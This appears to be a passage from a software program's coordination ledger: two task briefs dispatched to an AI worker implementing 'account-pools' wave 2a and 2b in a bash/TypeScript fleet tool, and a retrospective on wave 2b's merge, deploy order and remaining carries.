>
> Do not update `docs/superpowers/programs/account-pools.md` — the ledger is mine. Do not deploy. Do not merge.

---

**Wave 2a brief, as dispatched 2026-09-06 11:12 UTC (run 33, same worker `ccrc-pwa-clear-meadow`, resumed and cleared):**

> Program `account-pools`, WAVE 2a of 6, run 33. Same workspace, fresh wave — dispatch cleared your context, so everything you knew is in the files below, not in your head.
>
> WHAT THIS WAVE IS. The tag on the fleet box and the one predicate every account decision will ask: `$REG/pools/<project>` storage, `_project_pool_state` (four words, never dies — it runs inside the long-lived `cmd_supervise` loop), `_pool_ok` with its THREE exit codes, the `ccd project-pool` writer verb, the agent grant and the two `CCD_ARGV` builders, fresh placement (`_ws_least_loaded [project]`, `cmd_ws_add`'s refusal), `POOLS_CAP`, the doctor check, and the `rehome` lifecycle act in all three vocabularies. Nine tasks; Task 9 is the whole-branch gate AND the agent-first deploy order.
>
> THIS WAVE IS AGENT-FIRST. It touches `ccd/`, so the fleet host ships before the server. You do NOT deploy — report the fingerprint and I run both lanes in order. Task 9 states the order; read it, do not perform it.
>
> YOUR REQUIREMENTS: the plan `docs/superpowers/plans/2026-09-05-account-pools-wave2a-ccd-tag-placement.md`, then the spec `docs/superpowers/specs/2026-09-04-account-pools-design.md`. Program ledger: `docs/superpowers/programs/account-pools.md`. Read the plan's Global Constraints and Wave map once.
>
> WAVE 1 IS MERGED — fetch `origin/main` and build on it. What it produced that you consume, by exact name, none of which you may re-spell: `POOL_NAME_RE` in `shared/roster.ts` (your bash literal is pinned against `POOL_NAME_RE.source`), `AccountDef.pool`, `_ccrc_pool()` in the generated `~/.ccrc/accounts.sh` (your `_acct_pool` reads it), `POOL_RULE_CASES` and `POOLED_TEST_ROSTER` in `server/test/fixtures/poolRule.ts`, and `poolRule` in `shared/poolrule.ts` — the TypeScript spelling your bash `_pool_ok` must agree with case for case, driven through the SAME table.
>
> FOUR THINGS FROM WAVE 1 YOUR PLAN CANNOT SEE:
> 1. `POOLED_TEST_ROSTER` now THROWS at import if a `POOL_BY_ID` key names an id absent from `DEFAULT_TEST_ROSTER`. It was added because a silent miss would have cost your `seedAccountsSh` coverage one `_ccrc_pool` arm invisibly. A mutated fixture fails at COLLECTION with the guard's own message, not as a wrong assertion downstream.
> 2. `accounts.sh` now emits SIX functions, up from five. TWO comments under `ccd/` still say five: `ccd/ccrc-wrapper-shape:41-43` and `ccd/ccrc:1030`. Wave 1 could not touch them — its own gate required an EMPTY `ccd/` diff. **You are in `ccd/` anyway: fix both, this wave.** Wave 5's plan names neither file, so if you skip them nobody else is scheduled to.
> 3. The pool rule's precedence is load-bearing and easy to get wrong invisibly: `unreadable`/`malformed` are decided FIRST, before either untagged shortcut. An unreadable tag over an untagged ACCOUNT still answers undecidable — the constraint is unknown, not absent. Every other row of the table hides this ordering mistake.
> 4. **A hazard wave 1 could not measure and handed you deliberately.** `POOL_RULE_CASES`'s two prefix rows say in their own text that they do NOT cover a bash `==` with an unquoted right side: no fixture pool name carries a glob metacharacter, and the no-real-names constraint means none ever can. You are the wave that can measure it — assert the QUOTING in `_pool_ok` directly rather than hoping a table row reaches it.
> 5. `deviation-refs` green does NOT mean "this block is this branch's alone" — the plans are already on `main`, so the same file defines the same numbers on both sides. Green means no OTHER plan defines an allocator-era number you also define.
>
> EXECUTION SKILL: invoke `superpowers:subagent-driven-development` and run it as written — fresh implementer per task, a review after each, the fix loop capped at five rounds, a whole-branch review at the end, rulings ledgered. Wave 1 ran ~110 findings across seven rounds with every finding handed to an independent refuter; roughly half were refuted. That refutation step is why its guards ended up measuring something. Keep it.
>
> WATCH FOR WAVE 1'S RECURRING DEFECTS, which cost it four fix rounds: (a) guards that measure NOTHING — a scan whose regex ate the line it counts, a row floor one below the row count, a predicate whose mutation left every suite green; prove each guard by MUTATING its subject, not by deleting the gate; (b) comments asserting later-wave machinery as present fact — if wave 2b or 3 owes it, write it as an obligation naming the owing wave, not as a report.
>
> BRANCH: commit on THIS workspace's own branch, never a separate feature branch. Base on `origin/main` after `git fetch origin`. At the end take "push and open a pull request" — never merge; merging is mine.
>
> DONE MEANS: all nine tasks complete, the SDD final review clean or its residuals parked with rulings, Task 9's gates green, branch pushed, PR opened against `main`, all CI checks green. Then mail me `wave-done`.
>
> WAVE-DONE MAIL: `kind:"status"`, `subject:"wave-done"`, `toId:"coordinator"`, `runId` 33, body = prose plus the fingerprint JSON exactly: `{"branchTip":"<40-hex>","prNumber":<n>,"prPhase":"open","handoffCommit":"<the same 40-hex>"}` — both shas identical, measured after your last push. Then STOP PUSHING. Say what waves 2b/3/4/5 need that their plans cannot see.
>
> MAIL: every mail to `coordinator` carries `"runId": 33` — another program is active and the runId-less form will not resolve. Send one `subject:"underway"` line when Task 1's implementer is dispatched. Deviations found during execution: write `D-TBD-<slug>` in full in the plan's `## Deviations found`, mail me `subject:"deviation-request"` with the slugs and count, I mint and mail back, you substitute before wave-done. Never invent a number; the program's D-1663–D-1688 block is fully defined and is not a reserve. Numbers spent so far outside it: D-1741, D-1742 (two rounds), D-1743 — all wave 1.
>
> SAFETY: fixture HOMEs only (`makeCcdHarness`, `mkTmp`, `seedRoster`, `seedAccountsSh`) — never the live `$HOME`, never a `ccd` verb against the live host, never tmux, `~/.cc-sessions`, `~/.cc-limits` or a `claude-session@*` unit. Never print a secret file's contents. `EXEC_COMMANDS` stays `['tmux','ccd']`; no `gh` grant, ever. No real account, pool, host or IP in any tracked file — fixture pools are `pool-a`, `pool-b`, `pool-ab`. Write repo-relative paths in anything you commit; the pre-push hook refuses a blob carrying an absolute worktree path.
>
> ONE RULE FOR YOUR PR, learned at wave 1's merge: eight of that wave's commit messages quoted `D-TBD-` slugs from before the numbers were issued, one as a subject. `dtbd.test.ts` scans file CONTENTS, not messages, so CI is green either way — but a default squash body lands superseded placeholders on `main` forever. Keep placeholder slugs out of commit SUBJECTS, and expect me to write the squash body by hand.
>
> Do not update the program ledger — it is mine. Do not deploy. Do not merge.

---

**Wave 2b brief, as dispatched 2026-09-07 09:16 UTC (run 34, same worker `ccrc-pwa-clear-meadow`, resumed and cleared) — 8083 bytes, composed 8185 against the 8192-byte envelope cap, and four trim passes to get there; the nine numbered carries are the whole point of it:**

> Program `account-pools`, WAVE 2b of 6, run 34. Same workspace, fresh wave — dispatch cleared your context, so everything you knew is in the files below, not in your head.
>
> WHAT THIS WAVE IS. The deciders. Wave 2a gave the fleet a tag and a predicate; you make the machinery ACT on them — the strand, `_swap_target`'s pool insertions, the 5-second tick, the crossing marker and its expiry, `cmd_swap`'s guard and flag, and `--cross-pool` on the four manual verbs. Eight tasks; Task 8 is the whole-branch gate and the deploy ORDER.
>
> THIS WAVE IS AGENT-FIRST — every change is under `ccd/`, so the fleet host ships before the server. You do NOT deploy: report the fingerprint and I run both lanes in order. Task 8 states the order; read it, do not run it.
>
> YOUR REQUIREMENTS: the plan `docs/superpowers/plans/2026-09-05-account-pools-wave2b-ccd-swap-strand-crossing.md`, then its spec `docs/superpowers/specs/2026-09-04-account-pools-design.md`. Read the plan's Global Constraints, Wave map and CONSUMED list once — its safety and no-real-names constraints bind; I do not restate them.
>
> WAVE 2a IS MERGED (`58ef97b6`) AND LIVE ON BOTH LANES — fetch `origin/main` and build on it. Your CONSUMED list is real now; do not re-spell or re-implement any of it.
>
> NINE THINGS FROM 2a YOUR PLAN CANNOT SEE — all obligations.
>
> 1. `_project_pool_state` DOES NOT VALIDATE ITS OWN `$1` — it answers on whatever `$POOLS_DIR/$1` composes to. 2a's callers pass a project already through `_ws_project_valid`; the TICK does not, nor do the four manual verbs. Decide where validation lives for your call sites and pin it. Do not assume the reader guards you.
>
> 2. `_pool_ok` GAINS ITS FIRST TICK AND MANUAL-VERB CALLERS here. 2a swept every comment near it for later-wave claims written as present fact; your diff makes that sweep stale. Run it again over the region you touch.
>
> 3. WRITE DICTATED COMMENTS IN THE OBLIGATION TENSE BY DEFAULT. 2a's most repeated defect, across four rounds, was a comment asserting machinery a later wave owes as present fact. Default spelling: "wave N is to do X", never "wave N does X". If the thing is yours and shipped, name it plainly so a grep finds it — your own code in the future tense is as wrong as the reverse.
>
> 4. `pool-tag-void` IS A NEW `swap.log` LINE CLASS 2a shipped — the writer verb's retraction when the tag it just wrote does not read back. `docs/superpowers/plans/2026-09-05-account-pools-wave5-docs.md:46` enumerates the swap.log classes and does NOT list it, and you add six more. Say so in wave-done, so wave 5 corrects that enumeration once with all seven.
>
> 5. WHEN `--cross-pool` LANDS, D-1798's PROMISE COMES TRUE — go close that entry. It records that the flag is refused TODAY by two different routes, depending on whether the shifted argument happens to name a roster id, both pinned in `server/test/ccd-project-pool.test.ts`. **I am the source of that entry's original false claim** — I wrote "refused by `_is_valid_wrapper`" from one measurement; the flag lands in the `id` slot, which is never wrapper-validated. Task 5 makes the flag real, so those two pins change DELIBERATELY: name them in your diff, say which behaviour the flag replaces, and mail me if either route should survive for another reason.
>
> 6. THE D-1796 TRIP-WIRE. That entry parks a two-arm case on the argument that `unreadable` and `malformed` reach the same DECISION and that `named` is unreachable from a failed read. If anything you write makes `named` reachable from a failed read, or gives the two words different decisions anywhere, **the entry is void and you tell me** — never quietly keep a park your own diff has falsified.
>
> 7. THE FILE/TIME/PLATFORM RULE, 2a's most expensive lesson. A claim about a FILE, about TIME (a cooldown, a jitter window, a tick period) and about a PLATFORM (bash version, kernel, filesystem semantics) are three measurements; evidence for one is not evidence for another. Your plan is dense with time claims — `SWAP_COOLDOWN` 900 s, `SWAPBLOCK_COOLDOWN` 1800 s, D-1675's 120 s jitter, the 5 s tick, D-1676's days-long stale-supervisor window. Measure each on its own axis. Companion rule: **a claim inherited from a review is not measured merely because a reviewer measured something nearby** — 2a shipped two of my false statements into production comments and tests because each rode beside a true one.
>
> 8. RESOLVE THE `D-TBD`/GREEN-CI TENSION EXPLICITLY BEFORE YOUR FINAL ROUNDS. `dtbd.test.ts` refuses a surviving placeholder in tracked file CONTENTS, so the branch cannot be green while one lives — yet late rounds are exactly what produce execution-time deviations. The resolution is ordering: batch the `deviation-request` so it reaches me BEFORE the final gate, substitute, then run Task 8's gates on the substituted tree. A gate green on a tree that still carried a placeholder proves nothing about the tree you push, so a deviation found DURING the gate re-runs it after substitution.
>
> 9. A PREDECESSOR CLAIM I COULD NOT REPRODUCE, handed over with my measurement. `ccd/ccrc-doctor-checks`'s `_check_pools` carries a comment calling the `|| :` after `_ccrc_pool "$a"` load-bearing — that without it a readable-but-pool-less roster reports `unmeasured`. On bash 5.2, with the shape `shared/generate.mjs` actually emits, `_ccrc_pool` returns 0 for an untagged account (an empty `case` and a non-matching `case` both do), so the third state is held by the unconditional `measured` sentinel and the `|| :` is a harmless net. Either exhibit the shape where it fires — if it exists, the comment is right and I want to see it — or soften the comment to say what it is.
>
> EXECUTION SKILL: invoke `superpowers:subagent-driven-development` and run it as written — fresh implementer per task, review after each, fix loop capped at five rounds, whole-branch review at the end. 2a's guards ended up measuring something because every finding went to an independent refuter first: keep that step, and prove each guard by MUTATING its subject, never by deleting the gate.
>
> BRANCH: this workspace's own branch, never a separate feature branch, based on `origin/main` after `git fetch origin`. End with "push and open a pull request" — merging is mine.
>
> DONE MEANS: eight tasks complete, SDD final review clean or residuals parked with rulings, Task 8's gates green, branch pushed, PR opened against `main`, all CI green. Then mail `wave-done`: `kind:"status"`, `subject:"wave-done"`, `toId:"coordinator"`, `runId` 34, body = prose plus the fingerprint JSON exactly `{"branchTip":"<40-hex>","prNumber":<n>,"prPhase":"open","handoffCommit":"<the same 40-hex>"}` — both shas identical, measured ONCE after your last push, then STOP PUSHING. Say what waves 3/4/5 need that their plans cannot see, and answer items 4, 5, 6 and 9 by name.
>
> MAIL: every mail to `coordinator` carries `"runId": 34` — another program is active and the runId-less form will not resolve. Send one `subject:"underway"` line when Task 1's implementer is dispatched. Deviations: write `D-TBD-<slug>` in full in the plan's `## Deviations found`, mail `subject:"deviation-request"` with slugs and count, I mint and mail back, you substitute before the final gate (item 8). Never invent a number, never take one from a gap, never call the allocator. Your plan-time block D-1671–D-1678 is already DEFINED — cite, do not redefine.
>
> SAFETY, the part your plan does not already say: yours is the wave that MOVES SESSIONS, so fixture HOMEs matter more here than anywhere — `makeCcdHarness` only, never the live `$HOME`, never a `ccd` verb against the live host, never tmux, `~/.cc-sessions`, `~/.cc-limits` or a `claude-session@*` unit. `_dispatch_swap`, tmux and `notify.sh` stubbed; `_avail` stays real, steered through the fixture's own limit files.
>
> YOUR PR: keep `D-TBD-` slugs out of commit SUBJECTS — twice now a wave's default squash body would have landed superseded placeholders on `main`, invisibly to CI. I write the squash body by hand.
>
> Do not update the program ledger — it is mine. Do not deploy. Do not merge.

## Wave 2b SHIPPED — 2026-09-08

Merged `4dc87366` (squash, PR #62: 27 commits, 19 files, +3449 −250). Both lanes deployed the same
hour, **SERVER FIRST** at 17:17Z (`/health` → 4dc87366), agent lane at 17:18Z (`ccd` → 4dc87366, all
17 `claude-session@*` units verified active with stable MainPIDs). Run 34 closed `done`; **run 35
(wave 3) was opened BEFORE that close** — zero open runs retires the program irreversibly.
The wave is on `main`, so D-1671–D-1678 (plan-time), D-1868–D-1895 (execution), D-1908–D-1921 (merge
round), D-1955–D-1967 (fix round) and D-1972–D-1976 (round 3) are now full refs, not prefix-less.

### The three-round arc, and the one lesson that generalises

Round 1 fixed D-1915 and introduced D-1962. Round 2 fixed D-1962 and introduced its mirror —
EXISTENCE substituted for AVAILABILITY, when `_swap_target` requires `_pool_ok` AND `_account_ok` AND
`_avail`. Round 3 introduced nothing. The difference was not effort or care; it was **the shape of the
instruction**. Rounds 1–2 said "correct these sentences". Round 3 said **DELETE OR POINT**: every edit
must be a deletion, a pointer to the one normative home, or a verbatim quotation of the three
predicates, and **no new fact may be asserted anywhere**. The output space became "fewer claims"
instead of "different claims", and the regress stopped in one round.

**Carry to every future fix round on prose:** when a correction round produces a new false claim, do
NOT send a longer list. Forbid new assertions. The root was never carelessness — it was one rule
paraphrased in ten hand-written homes, which is the same defect this repo already forbids for values
("enumerated once and derived") and had never applied to prose.

### A coordinator defect of mine, recorded because it cost a cycle

My round-3 brief told the worker to write "the thirteen unrefuted findings" into the carry list. **I
never transmitted them.** Twenty-one findings were reported to me; I passed eight. The worker did not
invent the rest — it wrote in the plan that the coordinator had not sent them, and asked. That is
exactly right, and the defect is mine. **A brief must not ask for a list the brief does not carry.**

### The thirteen, triaged against the shipped tip — not relayed

Round 3 had already closed most of them before I sent any: the pin now extracts and executes the
command the prose cites (not a transcribed copy); `of 39` and `(32 green)` are gone; `REFUSES
placement either way` is gone; the doctor warning is availability-worded; the heading numeral is
pinned. **Two remain open and belong to wave 3:**

- **CARRY W3-1 — the `ccd:NNNN` figure still carries the very defect D-1956 exists to fix.** The prose
  says "143 lines of `ccd:NNNN` citations". Measured on `4dc87366`: the natural
  `grep -cE 'ccd:[0-9]+'` answers **146 lines / 157 occurrences**. 143/154 is reachable only with an
  unstated `ccd:[0-9]{2,}`, which silently drops three real single-digit citations — `ccd:9` at
  `:5603`, `ccd:4` at `:10645` and `:11019`. A count with no named command, and the obvious command
  disagrees with it.
- **CARRY W3-2 — D-1955 closed ONE of the three absence assertions, not three.**
  `BLOCKED_REAL_DISPATCH` stubs `_svc_run_detached` with `return 0`, so the argv IS captured — which
  is what makes the `--cross-pool` mutation detectable, and that arm is genuinely fixed — but
  `cmd_swap` never EXECUTES. The `.crosspool` marker and the `cross-pool` log line are written by
  `_crosspool_mark` and the echo in `cmd_swap`'s success tail, neither of which runs. Those two
  assertions still cannot fail against their real writers. The wave-done mail's "all three … FIXED"
  overstates it.

### The deploy handshake that stopped a silent regression

PR #65 — the trust-dialog incident fix, `af8e75f3` — deployed to the fleet host at 15:59Z, hours
before this wave's own agent lane. **Both lanes install `ccd`.** Deploying wave 2b from the BRANCH
rather than from merged `main` would have shipped a `ccd` without `_answer_two_option_dialog`,
re-breaking the dialog that orphaned five fleet sessions that afternoon — with no test anywhere that
would have noticed. Rule, now standing: **the agent lane installs from MERGED MAIN, never a branch,
and the deploy first asserts `git merge-base --is-ancestor <the other lane's sha> <the sha being
deployed>`.** Asserted here before either lane ran; it passed, and `_answer_two_option_dialog` was
measured byte-identical to main's in the merged file with the trust branch calling it.
